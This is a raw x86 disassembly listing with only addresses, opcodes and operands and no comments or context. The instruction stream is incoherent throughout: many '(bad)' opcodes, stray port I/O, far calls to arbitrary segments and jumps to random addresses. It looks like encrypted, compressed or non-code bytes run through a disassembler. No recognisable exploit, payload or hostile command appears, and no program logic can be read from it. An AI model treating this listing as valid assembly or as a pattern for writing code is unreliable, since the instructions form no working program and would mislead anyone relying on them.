  4160e9:	pusha  
  4160ea:	ja     0x416093
  4160ec:	xor    al,0x23
  4160ee:	xor    BYTE PTR [ebx+edi*2-0x1f],ah
  4160f2:	enter  0xc328,0x89
  4160f6:	add    al,0xb
  4160f8:	fistp  QWORD PTR [eax+0x63651736]
  4160fe:	mov    bl,ch
  416100:	xchg   edi,eax
  416101:	das    
  416102:	xor    al,0x89
  416104:	aas    
  416105:	shl    BYTE PTR [edx*8+0x66d22173],cl
  41610c:	pop    esp
  41610d:	xor    eax,0xa3c52f9d
  416112:	je     0x4160a2
  416114:	sub    DWORD PTR [esi-0x25],edx
  416117:	imul   esi,edi,0xffffffea
  41611a:	stos   DWORD PTR es:[edi],eax
  41611b:	pop    ecx
  41611c:	push   eax
  41611d:	loope  0x4160f1
  41611f:	bnd jg 0x416173
  416122:	mov    ch,0xdf
  416124:	jnp    0x416188
  416126:	pusha  
  416127:	add    BYTE PTR [edx-0x1b],ah
  41612a:	sub    ebx,DWORD PTR [esi-0x1e0e9eaf]
  416130:	dec    esp
  416131:	jae    0x416155
  416133:	mov    ebp,edi
  416135:	mov    dl,0x67
  416137:	rol    DWORD PTR [ebx-0x19],0x43
  41613b:	out    dx,eax
  41613c:	popf   
  41613d:	(bad)  
  41613e:	retf   
  41613f:	inc    edx
  416140:	outs   dx,DWORD PTR ds:[esi]
  416141:	jmp    0xc2524732
  416146:	outs   dx,DWORD PTR ds:[esi]
  416147:	sub    DWORD PTR [ebx],edi
  416149:	add    al,0xf8
  41614b:	xchg   ecx,eax
  41614c:	and    bh,dh
  41614e:	pushf  
  41614f:	jnp    0x4161b2
  416151:	mov    ds:0x8dc0b16b,eax
  416156:	mov    ebx,0x161f111f
  41615b:	pop    ecx
  41615c:	cmp    al,0x36
  41615e:	sbb    DWORD PTR [esp+ebp*1-0x13],ebp
  416162:	out    0xf5,eax
  416164:	push   es
  416165:	lahf   
  416166:	mov    DWORD PTR [edi+edi*2-0x7543d591],0x6ff253aa
  416171:	test   BYTE PTR [esp+eax*1+0x2d5554ea],dl
  416178:	and    al,0x19
  41617a:	lds    ecx,FWORD PTR [esi+0x45]
  41617d:	cmp    DWORD PTR [esi+eax*1+0x7e68fb8e],esp
  416184:	je     0x416108
  416186:	jno    0x41610d
  416188:	ds jecxz 0x41612d
  41618b:	jge    0x416122
  41618d:	stos   BYTE PTR es:[edi],al
  41618e:	xchg   esp,eax
  41618f:	rcr    BYTE PTR [ebp+0x350ecdb2],cl
  416195:	jns    0x4161f5
  416197:	call   0xc1262334
  41619c:	adc    ebx,DWORD PTR [eax+ecx*8-0x7260c2d8]
  4161a3:	imul   edx,DWORD PTR ds:[ebx-0x5e5199d3],0x7b18806f
  4161ae:	add    ah,BYTE PTR [esi]
  4161b0:	sbb    DWORD PTR [ecx],edx
  4161b2:	sbb    eax,0x9b0d5c3d
  4161b7:	outs   dx,DWORD PTR ds:[esi]
  4161b8:	dec    edx
  4161b9:	mov    al,0xbc
  4161bb:	addr16 jle 0x416158
  4161be:	mov    ch,0x80
  4161c0:	mov    cl,0x1
  4161c2:	out    dx,al
  4161c3:	je     0x416232
  4161c5:	cmp    eax,0x5f74582b
  4161ca:	enter  0xbe95,0x56
  4161ce:	popf   
  4161cf:	lds    edx,FWORD PTR ds:0xcfcbc8bf
  4161d5:	jp     0x41619e
  4161d7:	into   
  4161d8:	loopne 0x416234
  4161da:	retf   
  4161db:	sub    ah,BYTE PTR [esi]
  4161dd:	fdivrp st(3),st
  4161df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161e0:	pop    esi
  4161e1:	ret    0x4544
  4161e4:	out    0x1e,al
  4161e6:	in     al,0xcc
  4161e8:	scas   eax,DWORD PTR es:[edi]
  4161e9:	add    BYTE PTR [ecx-0x18],ah
  4161ec:	mov    dh,0x24
  4161ee:	sbb    ah,BYTE PTR [eax+esi*2+0xf]
  4161f2:	xchg   edi,eax
  4161f3:	pop    esi
  4161f4:	jmp    0x4161d1
  4161f6:	data16 jns 0x41619e
  4161f9:	(bad)  
  4161fa:	(bad)  
  4161fb:	out    0xa9,eax
  4161fd:	xor    al,0xc8
  4161ff:	lock aas 
  416201:	mov    cs,WORD PTR [ecx+0x18]
  416204:	in     al,0x68
  416206:	xchg   ebp,eax
  416207:	scas   eax,DWORD PTR es:[edi]
  416208:	adc    BYTE PTR [ecx],cl
  41620a:	xchg   esp,eax
  41620b:	mov    ch,0x95
  41620d:	or     al,0xf4
  41620f:	lock pop ebp
  416211:	xchg   edx,eax
  416212:	adc    DWORD PTR ss:0x9612142d,0xffffffba
  41621a:	cmp    ch,BYTE PTR [eax-0x2fc5c19b]
  416220:	adc    ah,ah
  416222:	adc    ebp,0x740d14d7
  416228:	inc    edi
  416229:	and    BYTE PTR [edx-0x9],al
  41622c:	add    BYTE PTR [esi-0x77],bh
  41622f:	add    DWORD PTR [ebx+0x28],esi
  416232:	pop    ebx
  416233:	pop    esi
  416234:	les    esi,FWORD PTR [esi+0x2611b27]
  41623a:	cmc    
  41623b:	dec    ebx
  41623c:	pop    es
  41623d:	push   ds
  41623e:	sbb    bh,BYTE PTR [ecx-0x2e]
  416241:	mov    dh,0x52
  416243:	scas   eax,DWORD PTR es:[edi]
  416244:	ins    DWORD PTR es:[edi],dx
  416245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416246:	scas   eax,DWORD PTR es:[edi]
  416247:	pusha  
  416248:	addr16 pop esi
  41624a:	adc    al,0xd7
  41624c:	sub    BYTE PTR [ebx+0x1d5f3c00],cl
  416252:	fucomip st,st(0)
  416254:	mov    ecx,DWORD PTR [edx+esi*2]
  416257:	sbb    BYTE PTR [edi],ch
  416259:	mov    ds:0x5cb8ed19,al
  41625e:	ror    BYTE PTR [ebx+0x6],1
  416261:	lock adc al,0x85
  416264:	or     eax,0x1ac4c79a
  416269:	aam    0x3d
  41626b:	xchg   esp,eax
  41626c:	and    DWORD PTR [edi+eax*4-0x14588a19],0xb8b2aff3
  416277:	out    0x5c,al
  416279:	aam    0x84
  41627b:	dec    edi
  41627c:	dec    ebx
  41627d:	adc    bh,BYTE PTR [esi]
  41627f:	pop    esi
  416280:	lods   eax,DWORD PTR ds:[esi]
  416281:	jne    0x41629e
  416283:	pop    edi
  416284:	sbb    BYTE PTR [ebp+0x70],bh
  416287:	cdq    
  416288:	adc    al,0xb0
  41628a:	cmp    al,BYTE PTR ds:0x291a5ca9
  416290:	loop   0x416298
  416292:	or     edx,edi
  416294:	fs inc ebp
  416296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416297:	add    BYTE PTR [ecx],bl
  416299:	jo     0x416227
  41629b:	mov    eax,0x8e73ca10
  4162a0:	dec    esp
  4162a1:	out    dx,eax
  4162a2:	rol    bh,1
  4162a4:	sbb    edx,DWORD PTR [edx-0x3e]
  4162a7:	push   ds
  4162a8:	mov    ds:0x51f4a84,al
  4162ad:	scas   eax,DWORD PTR es:[edi]
  4162ae:	push   es
  4162af:	bound  esi,QWORD PTR [edx-0x31]
  4162b2:	xor    bh,BYTE PTR [edx+0x36]
  4162b5:	test   eax,0xf34510a
  4162ba:	xchg   esi,eax
  4162bb:	fdivr  QWORD PTR [edx-0x5c]
  4162be:	sub    eax,0x1cc07728
  4162c3:	test   eax,0xcd9f5606
  4162c8:	in     al,0x37
  4162ca:	mov    edi,0x7caa63b1
  4162cf:	ds jg  0x4162c4
  4162d2:	cmp    ch,al
  4162d4:	pop    edi
  4162d5:	xchg   cl,cl
  4162d7:	stos   DWORD PTR es:[edi],eax
  4162d8:	cmp    eax,DWORD PTR [ecx+ecx*8]
  4162db:	mov    esp,0x41d56708
  4162e0:	or     BYTE PTR [ecx+0x36],0x34
  4162e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162e5:	cmp    ecx,0x138a05af
  4162eb:	cmp    al,0x64
  4162ed:	mov    ebx,0x94a1d3af
  4162f2:	pop    edi
  4162f3:	nop
  4162f4:	and    ebx,esi
  4162f6:	shr    DWORD PTR [ebp-0x37179281],0xfa
  4162fd:	dec    ecx
  4162fe:	xor    DWORD PTR [ebp+0x21],esi
  416301:	jbe    0x4162b0
  416303:	push   0x30
  416305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416306:	enter  0x8a46,0xbb
  41630a:	retf   0xa84f
  41630d:	and    al,0x6a
  41630f:	or     BYTE PTR [edx-0x3dcf2eaf],cl
  416315:	sbb    ebx,edi
  416317:	das    
  416318:	stos   DWORD PTR es:[edi],eax
  416319:	pop    ss
  41631a:	mov    bh,0x1b
  41631c:	jl     0x416397
  41631e:	mov    esp,0xe45f484f
  416323:	lods   eax,DWORD PTR ds:[esi]
  416324:	dec    edi
  416325:	dec    ebx
  416326:	fdivp  st(0),st
  416328:	sub    eax,0x65e9ae96
  41632d:	mov    BYTE PTR [ebx],cl
  41632f:	loop   0x4162e0
  416331:	(bad)  
  416332:	loopne 0x4163ae
  416334:	xor    al,0xdb
  416336:	lods   al,BYTE PTR ds:[esi]
  416337:	jmp    0x4162c1
  416339:	fcomip st,st(0)
  41633b:	hlt    
  41633c:	stos   DWORD PTR es:[edi],eax
  41633d:	dec    edi
  41633e:	shr    BYTE PTR [ebx-0x7e45a75e],0xf1
  416345:	mov    ecx,0x819d35b
  41634a:	push   eax
  41634b:	sub    BYTE PTR [ecx-0x5],ch
  41634e:	ret    0x6834
  416351:	cmp    ecx,edi
  416353:	fwait
  416354:	iret   
  416355:	pop    edi
  416356:	shl    BYTE PTR [edi+eax*1],1
  416359:	add    BYTE PTR [esi-0x7ac70e9f],bl
  41635f:	call   0x7f57c780
  416364:	jmp    0x41631b
  416366:	or     BYTE PTR ds:0xf56b0910,dl
  41636c:	daa    
  41636d:	rcr    al,cl
  41636f:	inc    eax
  416370:	mov    esp,0x5d897218
  416375:	nop
  416376:	mov    ebp,DWORD PTR [ecx+0x6672fda0]
  41637c:	xchg   ecx,eax
  41637d:	sbb    dh,al
  41637f:	js     0x416376
  416381:	xchg   ebx,eax
  416382:	push   cs
  416383:	mov    cl,0x42
  416385:	loopne 0x4163a9
  416387:	dec    ebx
  416388:	or     ebp,ecx
  41638a:	or     eax,0x3eb48a71
  41638f:	aam    0xeb
  416391:	lock xchg ebp,eax
  416393:	mov    bl,0x57
  416395:	pop    ss
  416396:	lahf   
  416397:	inc    edx
  416398:	add    DWORD PTR ds:0x6417da07,eax
  41639e:	ret    
  41639f:	xchg   edx,eax
  4163a0:	cmp    esi,DWORD PTR [ebx]
  4163a2:	sbb    eax,0x46d23a0
  4163a7:	xor    bh,0x26
  4163aa:	ds ss jns 0x4163e5
  4163ae:	fwait
  4163af:	mov    ecx,0xe397cd82
  4163b4:	leave  
  4163b5:	xchg   esi,eax
  4163b6:	mov    ch,0x24
  4163b8:	push   edi
  4163b9:	stc    
  4163ba:	adc    esi,DWORD PTR [ebp+edi*8+0x22]
  4163be:	push   eax
  4163bf:	xor    eax,0x373e4879
  4163c4:	adc    DWORD PTR gs:[ebp+0x66],0xad20faaf
  4163cc:	add    al,0x81
  4163ce:	loopne 0x416394
  4163d0:	(bad)  
  4163d1:	iret   
  4163d2:	fstp   QWORD PTR [edx]
  4163d4:	xchg   esp,eax
  4163d5:	adc    esp,DWORD PTR [edi-0x72]
  4163d8:	and    ah,BYTE PTR [edi+0x2333d89f]
  4163de:	dec    esi
  4163df:	mov    ch,0xed
  4163e1:	xchg   ebx,eax
  4163e2:	pop    esp
  4163e3:	in     eax,0x3f
  4163e5:	sbb    edx,0x9636dd1a
  4163eb:	mov    ebp,0x6ef20cf8
  4163f0:	cmp    DWORD PTR [ebx+0x19],0x4f
  4163f4:	les    esp,FWORD PTR [edi-0x4c]
  4163f7:	mov    cl,0xdd
  4163f9:	xchg   DWORD PTR [edi+0x562610fc],edi
  4163ff:	pop    ecx
  416400:	fs sbb eax,0xc911d0f
  416406:	sbb    eax,0x3c40d413
  41640b:	cmp    al,0x69
  41640d:	rol    DWORD PTR [ebp+0x74],1
  416410:	dec    eax
  416411:	inc    esi
  416412:	jmp    0xb8f7cccf
  416417:	fwait
  416418:	js     0x416478
  41641a:	add    bh,ah
  41641c:	cmp    cl,al
  41641e:	or     DWORD PTR ds:0x5a103a74,0xfd5f747f
  416428:	retf   
  416429:	add    ah,al
  41642b:	sub    ebp,DWORD PTR [eax-0x6d92c75]
  416431:	mov    bh,0x8a
  416433:	mov    ch,0x9e
  416435:	pop    edi
  416436:	xor    eax,0x3add66a4
  41643b:	mov    edx,DWORD PTR [edi+0x48]
  41643e:	call   0x99f9:0x9dfbf45d
  416445:	adc    dl,BYTE PTR [eax+ebx*1-0x42]
  416449:	out    dx,eax
  41644a:	sbb    eax,0xf2f695f9
  41644f:	cld    
  416450:	call   0xe8113fc7
  416455:	mov    bh,0x60
  416457:	call   0xb0b8baf7
  41645c:	xchg   DWORD PTR [edx+esi*2],esi
  41645f:	sbb    DWORD PTR [ebx+eax*1],0xd9b45c71
  416466:	es retf 
  416468:	ds inc edx
  41646a:	push   0x90d54b4c
  41646f:	xchg   DWORD PTR [ecx],esi
  416471:	jl     0x416480
  416473:	(bad)  
  416474:	mul    BYTE PTR [ebx]
  416476:	add    BYTE PTR [edx+0x69b3cabf],ah
  41647c:	icebp  
  41647d:	(bad)  
  41647e:	mov    edi,0xd0927514
  416483:	fidivr DWORD PTR [ebp-0x1f107dcf]
  416489:	and    BYTE PTR [bp+si],dh
  41648c:	jg     0x4164fc
  41648e:	dec    ebx
  41648f:	dec    ebx
  416490:	push   edx
  416491:	leave  
  416492:	push   cs
  416493:	xor    al,BYTE PTR [ebx-0x5b064a3b]
  416499:	adc    BYTE PTR [ecx-0x80],bh
  41649c:	xchg   ecx,eax
  41649d:	sub    cl,ah
  41649f:	loop   0x4164d9
  4164a1:	or     edx,DWORD PTR [eax-0x78862b9c]
  4164a7:	sub    DWORD PTR [esi],edi
  4164a9:	adc    bh,bl
  4164ab:	popf   
  4164ac:	dec    eax
  4164ad:	jge    0x416491
  4164af:	into   
  4164b0:	out    dx,eax
  4164b1:	cmc    
  4164b2:	imul   ecx,DWORD PTR [ebp-0x438de455],0xd147f2e9
  4164bc:	add    eax,0xc353b47b
  4164c1:	data16 scas al,BYTE PTR es:[edi]
  4164c3:	dec    edi
  4164c4:	or     BYTE PTR [ebp+0x7a4f882],ah
  4164ca:	leave  
  4164cb:	or     bl,ah
  4164cd:	sbb    BYTE PTR [edi-0x45],bl
  4164d0:	loope  0x416501
  4164d2:	xor    BYTE PTR [eax],cl
  4164d4:	repz sahf 
  4164d6:	dec    esp
  4164d7:	hlt    
  4164d8:	mov    ebx,0xdc8e0033
  4164dd:	sahf   
  4164de:	sub    BYTE PTR [esi+0x60ec55a],dl
  4164e4:	nop
  4164e5:	sub    edx,DWORD PTR [esi]
  4164e7:	push   ss
  4164e8:	cwde   
  4164e9:	add    eax,DWORD PTR [ebp+eiz*8+0x7a]
  4164ed:	dec    edx
  4164ee:	cli    
  4164ef:	lods   eax,DWORD PTR ds:[esi]
  4164f0:	jmp    0x416483
  4164f2:	push   0xe6d3b9ca
  4164f7:	mov    eax,0x9bd031d3
  4164fc:	or     ch,dl
  4164fe:	cmp    BYTE PTR [eax],bl
  416500:	popf   
  416501:	sahf   
  416502:	das    
  416503:	push   ss
  416504:	popa   
  416505:	das    
  416506:	fstp   DWORD PTR [edx-0x1a]
  416509:	add    eax,0xedf412e7
  41650e:	mov    esi,0xf7695cf3
  416513:	pop    edx
  416514:	addr16 inc eax
  416516:	bound  esp,QWORD PTR [edi+0x4ea821db]
  41651c:	int3   
  41651d:	lods   al,BYTE PTR ds:[esi]
  41651e:	sub    eax,0xbc72269b
  416523:	xchg   edi,eax
  416524:	push   esp
  416525:	int3   
  416526:	fiadd  WORD PTR [ecx+0x38c9af31]
  41652c:	fs push 0x9c716364
  416532:	pop    ebp
  416533:	sbb    DWORD PTR ds:0xe24f0a6a,0x6e
  41653a:	sbb    DWORD PTR [ebx+0x18c2c10d],ebx
  416540:	dec    ebp
  416541:	mov    eax,0x8f297293
  416546:	sub    BYTE PTR [edi],bl
  416548:	or     al,dh
  41654a:	pop    esi
  41654b:	mov    eax,DWORD PTR [edi+0x7f]
  41654e:	cdq    
  41654f:	imul   eax,DWORD PTR [edx+edi*4+0x55],0x77
  416554:	fidiv  WORD PTR [edi+0x6a]
  416557:	xor    DWORD PTR [edi-0x3d],esp
  41655a:	shl    BYTE PTR [ecx-0x2af871a7],0xbe
  416561:	test   eax,0xb3bd7402
  416566:	pop    edx
  416567:	xchg   ebp,eax
  416568:	bound  esp,QWORD PTR [eax+0x4c613c5f]
  41656e:	shr    DWORD PTR [ecx-0x48],cl
  416571:	mov    esp,0x6d039767
  416576:	in     al,dx
  416577:	and    eax,0xb5830efc
  41657c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41657d:	shr    BYTE PTR [edx],1
  41657f:	dec    esi
  416580:	in     al,0x95
  416582:	clc    
  416583:	retf   0xedb0
  416586:	sbb    bl,BYTE PTR [eax+0x3b]
  416589:	or     cl,ah
  41658b:	dec    esp
  41658c:	(bad)  
  41658d:	xchg   ecx,eax
  41658e:	xchg   BYTE PTR [ebp-0x34bab39],dh
  416594:	cli    
  416595:	stc    
  416596:	or     BYTE PTR [edi],bl
  416598:	rcr    edi,cl
  41659a:	pop    edi
  41659b:	push   0xffffffa9
  41659d:	xchg   ebx,eax
  41659e:	xor    ah,cl
  4165a0:	pushf  
  4165a1:	cli    
  4165a2:	int    0x3b
  4165a4:	adc    al,BYTE PTR [eax]
  4165a6:	js     0x4165ed
  4165a8:	mov    ecx,DWORD PTR [ebx]
  4165aa:	sti    
  4165ab:	xor    BYTE PTR [esi+0x22],cl
  4165ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165af:	ret    0x18d
  4165b2:	or     eax,0xec2e634f
  4165b7:	dec    ebp
  4165b8:	sahf   
  4165b9:	test   BYTE PTR [edx-0x4e5413a7],0xa0
  4165c0:	dec    edi
  4165c1:	scas   eax,DWORD PTR es:[edi]
  4165c2:	mov    al,ds:0xeaf88ea7
  4165c7:	stos   BYTE PTR es:[edi],al
  4165c8:	je     0x4165c4
  4165ca:	pop    ds
  4165cb:	dec    ebp
  4165cc:	mov    al,0xa4
  4165ce:	jle    0x4165bf
  4165d0:	das    
  4165d1:	lods   eax,DWORD PTR ds:[esi]
  4165d2:	aas    
  4165d3:	adc    edi,DWORD PTR [eax+esi*2]
  4165d6:	xor    al,BYTE PTR [ecx-0x1b]
  4165d9:	pop    ss
  4165da:	mov    ch,0x6c
  4165dc:	dec    ebx
  4165dd:	out    0xee,eax
  4165df:	jmp    0x4165ea
  4165e1:	fistp  QWORD PTR [ebx]
  4165e3:	call   0xb0642d22
  4165e8:	add    eax,0xc669f464
  4165ed:	loopne 0x4165d8
  4165ef:	ror    DWORD PTR [eiz*8-0x34e71285],0xf2
  4165f7:	mov    ah,0xaf
  4165f9:	fcmovb st,st(5)
  4165fb:	and    bl,BYTE PTR [edx]
  4165fd:	sbb    eax,0xf7559004
  416602:	mov    ebp,0x6896a959
  416607:	mov    BYTE PTR [ecx+0x42],ah
  41660a:	cmp    eax,0xc714ff62
  41660f:	lahf   
  416610:	jno    0x416662
  416612:	jge    0x416610
  416614:	push   es
  416615:	cmc    
  416616:	cli    
  416617:	sbb    BYTE PTR [ebx+0x7e],ch
  41661a:	add    BYTE PTR [ecx+eiz*1+0x5202ec96],ah
  416621:	(bad)  [eax+ebp*8-0x309aa615]
  416628:	jno    0x416622
  41662a:	les    ecx,FWORD PTR [edx+eiz*1+0x242b0c64]
  416631:	mov    edi,0x2382ab08
  416636:	jmp    0x416678
  416638:	fs pop ds
  41663a:	retf   0xc4f7
  41663d:	pop    esp
  41663e:	or     bl,BYTE PTR [ebx-0x7d]
  416641:	es push ds
  416643:	addr16 mov eax,ds:0xb813
  416647:	jb     0x41667c
  416649:	or     BYTE PTR [eax+0x5e],0x22
  41664d:	push   es
  41664e:	(bad)  
  41664f:	mov    BYTE PTR [esi+esi*1-0x76234b5d],0x5a
  416657:	inc    ebp
  416658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416659:	pop    es
  41665a:	(bad)  
  41665b:	or     al,0x8f
  41665d:	in     al,0x43
  41665f:	jmp    0x4166da
  416661:	xor    al,0xfd
  416663:	jo     0x4165e5
  416665:	imul   ecx,DWORD PTR [ebp-0x6b],0xffffffbb
  416669:	mov    eax,ds:0x19c46fce
  41666e:	in     al,dx
  41666f:	cmp    ch,BYTE PTR [edi+0x1a]
  416672:	cmp    BYTE PTR [ebp-0x7c],bl
  416675:	mov    ecx,0xdf3fb1da
  41667a:	cmp    ah,dh
  41667c:	mov    BYTE PTR [edi+0x2d],0x46
  416680:	dec    eax
  416681:	pusha  
  416682:	popa   
  416683:	jecxz  0x416688
  416685:	iret   
  416686:	ins    DWORD PTR es:[edi],dx
  416687:	push   ecx
  416688:	xchg   esp,eax
  416689:	add    BYTE PTR [ecx],dl
  41668b:	pushf  
  41668c:	mov    edx,0x2a5dbd2c
  416691:	jge    0x416683
  416693:	enter  0x546a,0x12
  416697:	pop    ebx
  416698:	jne    0x416708
  41669a:	adc    eax,0x1e229422
  41669f:	pop    ebp
  4166a0:	and    eax,DWORD PTR [ebx+0x2f088534]
  4166a6:	push   eax
  4166a7:	cmp    dl,0xae
  4166aa:	and    bh,BYTE PTR [esi+0x23]
  4166ad:	jl     0x41668f
  4166af:	jmp    0x4166d4
  4166b1:	adc    bh,BYTE PTR ds:0x32cac913
  4166b7:	pop    ss
  4166b8:	inc    edx
  4166b9:	stos   BYTE PTR es:[edi],al
  4166ba:	fwait
  4166bb:	iret   
  4166bc:	push   ebp
  4166bd:	(bad)  
  4166be:	dec    esp
  4166bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166c0:	add    bl,BYTE PTR ds:0xba312d4b
  4166c6:	mov    dh,0x20
  4166c8:	sub    edi,edx
  4166ca:	sub    DWORD PTR [esi-0x66],edi
  4166cd:	inc    ecx
  4166ce:	sub    DWORD PTR [esi-0x50],edi
  4166d1:	lods   eax,DWORD PTR ds:[esi]
  4166d2:	adc    al,0x86
  4166d4:	hlt    
  4166d5:	adc    al,0x36
  4166d7:	cs dec edi
  4166d9:	mov    al,0x0
  4166db:	xchg   esp,eax
  4166dc:	into   
  4166dd:	and    esi,DWORD PTR [edx]
  4166df:	pop    edi
  4166e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166e1:	mov    ebx,DWORD PTR [esi+0x2a078f5c]
  4166e7:	xchg   bp,ax
  4166e9:	icebp  
  4166ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166eb:	mov    edi,DWORD PTR [ebp+0x36]
  4166ee:	fs int3 
  4166f0:	dec    edi
  4166f1:	xor    eax,0xacde76ff
  4166f6:	cmp    dl,BYTE PTR [edi]
  4166f8:	jge    0x4166b8
  4166fa:	sar    esi,cl
  4166fc:	daa    
  4166fd:	mov    esp,0xf7739741
  416702:	sub    al,0x8c
  416704:	test   al,0xaa
  416706:	cmp    ch,BYTE PTR [edx+ecx*8+0x8]
  41670a:	hlt    
  41670b:	pop    ebp
  41670c:	jae    0x41676c
  41670e:	je     0x41672e
  416710:	jle    0x4166af
  416712:	call   0x51fe:0xbb72447f
  416719:	sub    esi,DWORD PTR [ecx+ebx*2-0x39]
  41671d:	and    DWORD PTR [ebp+0x7233ad6],edi
  416723:	add    eax,0x2f22e744
  416728:	imul   esi,DWORD PTR [ebx],0x25
  41672b:	or     eax,0xcbb4fe52
  416730:	push   0xffffffb2
  416732:	call   0x31c8:0x102ef4b7
  416739:	fiadd  WORD PTR [edx+ebp*1-0x41]
  41673d:	call   0x56d2e3e5
  416742:	(bad)  
  416743:	loopne 0x416791
  416745:	mov    ecx,0xeb67bd67
  41674a:	loope  0x4166dc
  41674c:	lea    ebx,[ecx]
  41674e:	(bad)  
  416750:	mov    ds:0xf46dbf5e,eax
  416755:	fs cwde 
  416757:	rcl    DWORD PTR [ebp-0x12044e49],1
  41675d:	dec    esi
  41675e:	in     eax,0xa4
  416760:	out    0xe9,eax
  416762:	fbld   TBYTE PTR [edi-0x482740f3]
  416768:	sub    DWORD PTR [edx+edx*1+0x4fd8d431],ecx
  41676f:	daa    
  416770:	sti    
  416771:	push   esp
  416772:	cmp    DWORD PTR [ecx+edi*8+0x63],eax
  416776:	jmp    0x1f6862a7
  41677b:	fmul   QWORD PTR [ebp-0x1f]
  41677e:	push   ecx
  41677f:	ret    0xaa52
  416782:	int    0x7d
  416784:	(bad)
  416787:	sub    ch,BYTE PTR [eax]
  416789:	lahf   
  41678a:	adc    BYTE PTR [edx],dh
  41678c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41678d:	xor    ecx,DWORD PTR [esi]
  41678f:	mov    esp,0x4a45a9ac
  416794:	push   ss
  416795:	popf   
  416796:	cdq    
  416797:	stos   BYTE PTR es:[edi],al
  416798:	mov    fs,esi
  41679a:	and    DWORD PTR [ebx+ebp*1],edx
  41679d:	out    0xab,al
  41679f:	enter  0x9ae8,0x7a
  4167a3:	into   
  4167a4:	and    BYTE PTR [ebx+0x47],ah
  4167a7:	addr16 or bl,bh
  4167aa:	mov    ah,0xa
  4167ac:	ror    BYTE PTR cs:[esi-0x80],cl
  4167b0:	cmp    eax,0x750a2bbd
  4167b5:	test   DWORD PTR ds:0x1778f0f5,0xcb76381d
  4167bf:	retf   
  4167c0:	in     al,dx
  4167c1:	mov    eax,0x505f051
  4167c6:	bound  edi,QWORD PTR [edi+0x7b594782]
  4167cc:	popa   
  4167cd:	dec    ebx
  4167ce:	push   eax
  4167cf:	imul   edi,esp,0xffffffd5
  4167d2:	outs   dx,DWORD PTR ds:[esi]
  4167d3:	dec    ebx
  4167d4:	cwde   
  4167d5:	lds    eax,FWORD PTR [edi]
  4167d7:	ins    BYTE PTR es:[edi],dx
  4167d8:	push   ebp
  4167d9:	int    0x9f
  4167db:	pop    edx
  4167dc:	push   ebp
  4167dd:	das    
  4167de:	cmp    al,0x7
  4167e0:	sub    DWORD PTR [ebp+0x1e],esi
  4167e3:	mov    dl,0x87
  4167e5:	fistp  QWORD PTR [ecx]
  4167e7:	adc    BYTE PTR [edx],bh
  4167e9:	jae    0x416852
  4167eb:	imul   edi,DWORD PTR [esi-0xb],0x3d
  4167ef:	(bad)  
  4167f0:	jno    0x41685c
  4167f2:	repnz rcr BYTE PTR ds:0xf4718c8e,1
  4167f9:	push   esp
  4167fa:	cli    
  4167fb:	cmp    cl,dl
  4167fd:	sbb    bl,al
  4167ff:	sti    
  416800:	or     edi,esi
  416802:	xor    al,0x68
  416804:	mov    dl,0xa9
  416807:	scas   eax,DWORD PTR es:[edi]
  416808:	mov    al,0x7d
  41680a:	jp     0x4167d1
  41680c:	je     0x4167c2
  41680e:	or     eax,0xa49fc100
  416813:	mov    eax,ds:0xa5730b98
  416818:	fwait
  416819:	mov    ds:0xd1dbb694,eax
  41681e:	arpl   WORD PTR [esi-0x30],di
  416821:	add    bl,BYTE PTR [eax-0x64da70ed]
  416827:	stos   BYTE PTR es:[edi],al
  416828:	cmp    edx,ebx
  41682a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41682b:	xchg   ebp,eax
  41682c:	mov    esi,0x8a1243d9
  416831:	inc    ebp
  416832:	xor    DWORD PTR [ecx-0x5aa3d971],eax
  416838:	push   eax
  416839:	pop    ds
  41683a:	adc    al,0x3d
  41683c:	lahf   
  41683d:	or     DWORD PTR [esi+edx*1-0x3964b37a],ebp
  416844:	fcomp  QWORD PTR [edx-0x26]
  416847:	and    ebx,ebx
  416849:	lods   al,BYTE PTR ds:[esi]
  41684a:	repz mov al,0x8e
  41684d:	xchg   edx,eax
  41684e:	sub    eax,0x3727ed34
  416853:	sub    BYTE PTR [ecx],bh
  416855:	call   0x10a1:0x5ca37e2
  41685c:	or     DWORD PTR [ecx],edx
  41685e:	mov    dl,0x3b
  416860:	in     al,dx
  416861:	jg     0x416850
  416863:	and    dl,BYTE PTR [esi+0x54]
  416866:	fcmove st,st(7)
  416868:	repnz ror DWORD PTR [ebp+0x59252af8],0xa4
  416870:	sub    BYTE PTR [esi+0x0],cl
  416873:	out    dx,eax
  416874:	scas   eax,DWORD PTR es:[edi]
  416875:	fsub   DWORD PTR [ebx-0x22]
  416878:	clc    
  416879:	mov    ch,0x3a
  41687b:	xor    BYTE PTR [esi+edi*4+0x6167eb4d],dl
  416882:	jmp    0x416839
  416884:	mov    dh,al
  416886:	cli    
  416887:	sbb    ebx,DWORD PTR [esi+0x576b54bf]
  41688d:	pop    esp
  41688e:	nop
  41688f:	pop    ds
  416890:	or     dh,al
  416892:	imul   ebp,DWORD PTR [edx],0x93310513
  416898:	sbb    ebx,DWORD PTR [eax-0x8]
  41689b:	ret    0x2f4f
  41689e:	pusha  
  41689f:	ss inc ecx
  4168a1:	or     DWORD PTR [ebx+0x65b9c8cf],ebx
  4168a7:	cmp    cl,BYTE PTR [ebx]
  4168a9:	inc    edi
  4168aa:	mov    edx,0xfc41e617
  4168af:	faddp  st(2),st
  4168b1:	xchg   edi,eax
  4168b2:	sbb    BYTE PTR [eax+0x4fc48216],0x1d
  4168b9:	and    dh,al
  4168bb:	repnz mov edx,0xca1190a1
  4168c1:	jo     0x4168db
  4168c3:	or     DWORD PTR [ecx+0x38],esp
  4168c6:	jg     0x4168d6
  4168c8:	(bad)  
  4168c9:	mov    al,ds:0x2d935a1c
  4168ce:	xchg   edx,eax
  4168cf:	clc    
  4168d0:	jl     0x4168da
  4168d2:	push   0xffffff9f
